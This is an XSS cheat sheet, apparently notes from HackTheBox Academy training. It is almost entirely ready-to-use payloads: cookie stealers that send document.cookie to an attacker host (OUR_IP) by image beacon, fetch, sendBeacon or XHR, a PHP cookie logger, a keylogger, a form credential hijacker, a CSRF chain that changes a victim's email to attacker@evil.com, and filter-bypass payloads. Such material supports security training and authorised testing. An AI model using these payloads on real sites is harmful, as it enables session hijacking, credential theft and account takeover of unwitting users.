title: XSS
html:
XSS

Commands

Basic XSS Payload

<script>alert(window.origin)</script>

Basic XSS Payload

<plaintext>

Basic XSS Payload

<script>print()</script>

HTML-based XSS Payload

<img src="" onerror=alert(window.origin)>

Change Background Color

<script>document.body.style.background = "#141d2b"</script>

Change Background Image

<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>

Change Website Title

<script>document.title = 'HackTheBox Academy'</script>

Overwrite website's main body

<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>

Remove certain HTML element

<script>document.getElementById('urlform').remove();</script>

Load remote script

<script src="http://OUR_IP/script.js"></script>

Send Cookie details to us (img beacon)

<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>

Run xsstrike on a url parameter

python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"

Start netcat listener

sudo nc -lvnp 80

Start PHP server

sudo php -S 0.0.0.0:80

Cookie Stealers

img beacon (no CORS)

<script>new Image().src='http://OUR_IP/steal?c='+document.cookie</script>

fetch (bypasses img CSP restrictions)

<script>fetch('http://OUR_IP/steal?c='+btoa(document.cookie))</script>

navigator.sendBeacon (async, survives page unload)

<script>navigator.sendBeacon('http://OUR_IP/steal',document.cookie)</script>

XMLHttpRequest

<script>
var x=new XMLHttpRequest();
x.open('GET','http://OUR_IP/steal?c='+document.cookie,true);
x.send();
</script>

PHP cookie logger (host on OUR_IP)

<?php
$logfile = 'cookies.txt';
$cookie  = $_GET['c'] ?? $_POST['c'] ?? file_get_contents('php://input');
file_put_contents($logfile, date('Y-m-d H:i:s').' | '.$_SERVER['REMOTE_ADDR'].' | '.$cookie."\n", FILE_APPEND);
?>

Keylogger

<script>
document.onkeypress = function(e) {
  fetch('http://OUR_IP/k?k=' + String.fromCharCode(e.charCode));
};
</script>

Form Credential Hijacker

Intercepts form submit and exfils credentials before the real submit fires:

<script>
document.querySelectorAll('form').forEach(function(f){
  f.addEventListener('submit',function(){
    var data=new URLSearchParams(new FormData(f)).toString();
    fetch('http://OUR_IP/steal?'+data);
  },true);
});
</script>

Session Riding via XSS (CSRF chain)

Steal CSRF token then perform state-changing action:

<script>
fetch('/profile',{credentials:'include'})
  .then(r=>r.text())
  .then(function(html){
    var token = html.match(/csrf[_-]?token["' ]+value=["']([^"']+)/i)[1];
    return fetch('/profile/update',{
      method:'POST',
      credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:'email=attacker@evil.com&csrf_token='+token
    });
  })
  .then(r=>fetch('http://OUR_IP/done?s='+r.status));
</script>

DOM-based XSS Patterns

innerHTML

document.getElementById('x').innerHTML = location.hash.slice(1)

document.write

document.write('<img src="'+decodeURIComponent(location.search)+'">

eval

eval(location.hash.slice(1))

setTimeout/setInterval

setTimeout(location.hash.slice(1),0)

src attribute

document.querySelector('script').src = location.search.substr(5)

Trigger DOM XSS via URL fragment: https://victim/#<img src=x onerror=alert(1)>

Polyglot & Filter Bypass Payloads

Works without <script> tag

<svg onload=alert(1)>

SVG embedded script

<svg><script>alert(1)</script></svg>

HTML entity evasion

<img src=x onerror="alert(1)">

Double-tag evasion

<scr<script>ipt>alert(1)</scr</script>ipt>

No-script event handler

<details/open/ontoggle=alert(1)>

Autofocus trigger

<input autofocus onfocus=alert(1)>

Mixed-case href bypass

jaVasCript:alert(1)

HTML entity in href

<a href="javascript:alert(1)">click</a>

Break out of attribute

"><img src=x onerror=alert(1)><"

Break out of single-quoted attribute

'><script>alert(1)</script>
